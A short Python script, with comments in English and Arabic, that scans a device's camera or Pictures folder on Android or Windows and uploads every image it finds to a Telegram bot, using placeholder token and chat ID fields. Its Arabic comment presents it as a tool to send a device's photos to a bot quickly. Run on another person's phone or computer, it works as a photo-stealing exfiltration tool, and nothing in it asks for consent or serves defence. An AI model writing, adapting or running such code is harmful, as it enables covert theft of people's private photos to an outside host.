#Python code: Anyone who runs it will receive all their Telegram bot images via the bot token and ID.
#كود بايثوم يقوم بلبحث عن الصور في الجهاز ويرسلها لبوت تلي كرام بسرعه فاىقه يشنغل علا الهاتف ة الكمبيوتر
import os
import requests

BOTTOKEN = "ضعالتوكن_هنا"
CHATID = "ضعالآيدي_هنا"

def get_image_files(directory):
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    return [f for f in os.listdir(directory) if f.lower().endswith(extensions)]

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{BOTTOKEN}/sendPhoto"
    try:
        with open(file_path, 'rb') as photo:
            payload = {'chat_id': CHATID}
            files = {'photo': photo}
            response = requests.post(url, data=payload, files=files)
            return response.json()
    except Exception as e:
        return str(e)

def start_extraction():
    if os.name == 'nt':
        path = os.path.join(os.environ['USERPROFILE'], 'Pictures')
    else:
        path = '/sdcard/DCIM/Camera'
        if not os.path.exists(path):
            path = os.getcwd()

    print(f"Scanning: {path}")

    images = get_image_files(path)
    if not images:
        print("No images found.")
        return

    for image in images:
        full_path = os.path.join(path, image)
        print(f"Sending: {image}")
        send_photo(full_path)

if __name__ == "__main__":
    start_extraction()
